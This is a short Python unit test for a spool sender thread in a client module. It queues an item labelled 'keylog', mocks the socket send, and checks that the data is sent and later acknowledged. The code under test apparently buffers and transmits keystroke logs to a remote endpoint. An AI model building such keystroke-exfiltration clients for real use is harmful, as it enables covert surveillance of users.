import threading, time
from unittest.mock import MagicMock, patch
from spool import Spool

def test_spool_sender_sends_and_acks(tmp_path):
    sp = Spool(tmp_path)
    sp.push("keylog", {"data": "abc", "time": "2026-01-01T00:00:00"})
    sent_commands = []
    mock_sock = MagicMock()
    import queue as q

    def fake_send(sock, msg, key=None):
        sent_commands.append(msg)

    stop = threading.Event()
    send_lock = threading.Lock()
    pending_acks = q.Queue()

    with patch("client.send_msg", fake_send):
        import client as c
        t = threading.Thread(
            target=c._spool_sender_thread,
            args=(mock_sock, None, sp, stop, send_lock, pending_acks, 0.05),
            daemon=True
        )
        t.start()
        time.sleep(0.3)
        stop.set()
        t.join(timeout=1)

    # Sender sent the data
    assert any("spool_data" in str(m) for m in sent_commands)
    # Item still in spool (ack happens in main loop on SPOOL_ACK command)
    # Simulate main loop acking it
    assert not pending_acks.empty()
    item_id = pending_acks.get_nowait()
    sp.ack(item_id)
    assert sp.pending() == []
